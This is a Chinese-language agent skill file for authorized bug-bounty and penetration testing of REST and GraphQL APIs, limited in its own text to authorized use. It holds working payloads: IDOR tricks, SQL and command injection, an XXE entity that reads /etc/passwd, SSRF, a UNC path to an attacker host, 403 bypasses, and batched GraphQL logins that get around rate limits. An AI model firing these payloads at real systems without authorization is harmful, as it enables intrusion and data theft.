---
name: api-fuzzing-bug-bounty
title: REST/GraphQL API 模糊测试与漏洞挖掘
description: 当在授权的漏洞赏金或渗透测试中需要对 REST/SOAP/GraphQL API 做侦察、模糊测试与越权挖掘时使用；做端点枚举、IDOR/BOLA、注入、鉴权绕过、403 绕过与 GraphQL 内省/批处理攻击并产出可复现 PoC 与漏洞清单；不适用于未授权目标、生产破坏性攻击或前端 UI/业务逻辑测试。触发词：API 模糊测试、IDOR、GraphQL 内省、鉴权绕过、Swagger 枚举、漏洞赏金
domain: 安全/appsec
triggers: [API 模糊测试, REST API 渗透测试, GraphQL 安全测试, IDOR, BOLA 越权, GraphQL 内省 introspection, Swagger/OpenAPI 枚举, API 鉴权绕过, 403/401 绕过, JSON 注入 SQLi, 漏洞赏金 API, Kiterunner API 发现, 批处理速率限制绕过, XXE/SSRF via API]
tags: [安全, appsec, API安全, 漏洞赏金, 渗透测试, GraphQL, REST, IDOR, 模糊测试, 越权, 攻击性安全]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Burp Suite, Kiterunner, SecLists, InQL, clairvoyance, graphw00f, GraphCrawler, batchql, graphql-cop, curl, Python, json2paths, Swagger-EZ]
requires: []
related: [idor-vulnerability-testing, broken-authentication-testing, ffuf-web-fuzzing, burp-suite-testing]
combines_with: [burp-suite-testing, red-team-recon, path-traversal-testing]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
## 何时使用

在**已获授权**的漏洞赏金或渗透测试中，需要系统性测试 REST、SOAP、GraphQL API 的安全性时使用。覆盖：端点侦察、IDOR/BOLA 越权、各类注入（SQLi/命令/XXE/SSRF）、鉴权绕过、HTTP 方法篡改、403/401 绕过，以及 GraphQL 内省、批处理速率绕过与嵌套 DoS。产物为可复现的越权 PoC、注入点、鉴权绕过手法与漏洞清单。

**仅限授权使用（AUTHORIZED USE ONLY）**：仅可用于授权的安全评估、防御性验证或受控的教育环境。

不该用的边界：
- 未获书面授权的目标，或超出 SoW/赏金范围的资产。
- 生产环境上的破坏性操作（如 DoS、`sleep()` 注入、`limit=9999999999` 等）—— 除非范围明确允许，否则只验证存在性、不打满。
- 纯前端/UI XSS、纯业务逻辑或客户端测试（用专门的 Web/客户端技能）。
- 已封装好的合规扫描器一键跑（本技能聚焦手工/半自动深挖）。

## 步骤

1. **侦察与端点枚举**：先判定 API 类型（SOAP=XML、REST=JSON/XML、GraphQL=单端点自定义查询），再找文档与隐藏路由。
2. **鉴权测试**：分别测 mobile / web / developer API 与各版本（/v1、/v2、/v3），核查速率限制。
3. **IDOR/BOLA**：遍历对象 ID，尝试多种包装绕过。
4. **注入测试**：JSON 内 SQLi、命令注入、XXE、SSRF、.NET `Path.Combine` 路径穿越。
5. **方法与内容类型篡改**：切换 GET/POST/PUT/DELETE/PATCH 与 JSON↔XML。
6. **GraphQL 专项**：内省、IDOR、注入、批处理绕速率、嵌套 DoS。
7. **403/401 绕过 + 输出侧利用（PDF 导出 LFI/SSRF）**。
8. **记录 PoC**：保留请求/响应差异，按风险定级输出清单。

## 指令

侦察（找文档 + 自动发现）：
```bash
# 常见 Swagger/OpenAPI 文档路径
/swagger.json  /openapi.json  /api-docs  /v1/api-docs  /swagger-ui.html
# Kiterunner 路由发现
kr scan https://target.com -w routes-large.kite
# 从 Swagger 抽取路径
python3 json2paths.py swagger.json
```
也查 archive.org 历史端点与前端 JS 文件中的接口。

鉴权（分端分版本）：`/api/mobile/login`、`/api/v3/login`、`/api/magic_link`、`/api/admin/login`；逐个核查鉴权端点是否缺速率限制（缺 → 可爆破）。

IDOR/BOLA 与绕过：
```bash
GET /api/users/1234 → GET /api/users/1235      # 基础遍历
/?user_id=111      # 邮箱式 ID 也试纯数字
{"id":111} → {"id":[111]}          # 数组包装
{"id":111} → {"id":{"id":111}}     # JSON 嵌套
URL?id=<LEGIT>&id=<VICTIM>          # 重复参数
{"user_id":"*"}                    # 通配
/api/get_profile?user_id=<victim>&user_id=<legit>   # 参数污染
```

JSON 内 SQLi（布尔/时间盲注）：
```json
{"id":"56456 AND 1=1#"}        // OK
{"id":"56456 AND 1=3#"}        // ERROR → 存在注入
{"id":"56456 AND sleep(15)#"}  // 时间盲注（授权且非生产再用）
```
命令注入：`?url=Kernel#open → ?url=|ls`；`?name=file.txt;ls%20/`
XXE：`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
SSRF：`<object data="http://127.0.0.1:8443"/>`
.NET 路径穿越：`?filename=C:\inetpub\wwwroot\web.config`、`?filename=\\smb.dns.attacker.com\a.png`

方法/内容类型：对同一资源轮测 GET/POST/PUT/DELETE/PATCH；`Content-Type: application/json → application/xml`。

403/401 绕过（受限时逐个试）：
```bash
/api/v1/users/sensitivedata.json
/api/v1/users/sensitivedata/       /api/v1/users/sensitivedata%20
/api/v1/users/sensitivedata%09     /api/v1/users/sensitivedata#
/api/v1/users/sensitivedata&details
/api/v1/users/..;/sensitivedata
```

GraphQL 专项：
```graphql
# 内省拉取完整 schema
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,args{name,type{name,kind}}}}}}
# IDOR：换其他用户 ID 取敏感字段
query { user(id:"OTHER_USER_ID"){ email password creditCard } }
# 注入
mutation { login(input:{email:"test' or 1=1--" password:"password"}){ success jwt } }
# 批处理绕速率限制（一次请求多条 mutation）
mutation {login(input:{email:"a@x.com" password:"p"}){success jwt}}
mutation {login(input:{email:"b@x.com" password:"p"}){success jwt}}
```
内省关闭时用 clairvoyance 重建 schema；指纹用 graphw00f，发现用 GraphCrawler / InQL，批处理与 DoS 检测用 batchql / graphql-cop。嵌套查询 DoS（posts→comments→user→posts… 递归）仅在授权且范围允许时验证。

输出侧利用（PDF/报表导出渲染 HTML 时）：`<iframe src="file:///etc/passwd">`（LFI）、`<object data="http://127.0.0.1:8443"/>`（SSRF）、`<img src="https://iplogger.com/...">`（IP 泄露）。

## 示例

例 1 — IDOR：携带自己 token，仅改对象 ID，观察是否返回他人数据。
```bash
GET /api/v1/invoices/12345   Authorization: Bearer <token>   # 自己
GET /api/v1/invoices/12346   Authorization: Bearer <token>   # 返回他人发票 → IDOR
```

例 2 — GraphQL 内省（curl）：
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'
```

## 注意事项

约束（Must）：mobile/web/developer API 分开测；测全所有版本 /v1 /v2 /v3；分别验证已认证与未认证访问。

禁止（Must Not）：假定各版本/各端口安全控制一致；跳过未公开端点；忽略速率限制核查。

建议（Should）：加 `X-Requested-With: XMLHttpRequest` 头模拟前端调用；查 archive.org 历史端点；对敏感操作测竞态条件（TOCTOU）。

常见排障：
- 接口无返回 → 加 `X-Requested-With: XMLHttpRequest`。
- 全端点 401 → 试附加 `?user_id=1`。
- GraphQL 内省被禁 → 用 clairvoyance 重建。
- 被限速 → IP 轮换或批处理请求。
- 找不到端点 → 查 Swagger、archive.org、前端 JS。

漏洞速查（IDOR/BOLA、JWT 弱点、Token 泄露、缓存配置错误、未公开端点、旧版本差异、速率缺失、竞态、XXE、内容类型切换、方法篡改）逐项过一遍。破坏性 payload（`sleep`、超大 `limit`、嵌套 DoS）务必先确认范围允许再用。

## 互见

- 同域可配合：Web 注入（SQLi/命令/XXE/SSRF 深挖）、JWT/鉴权安全、SSRF 利用链等 appsec 技能。
- 词表与工具：SecLists、Kiterunner、Swagger-EZ、MindAPI、json2paths。

---
采编自 sickn33/antigravity-awesome-skills（原作者 zebbern，MIT 许可）。
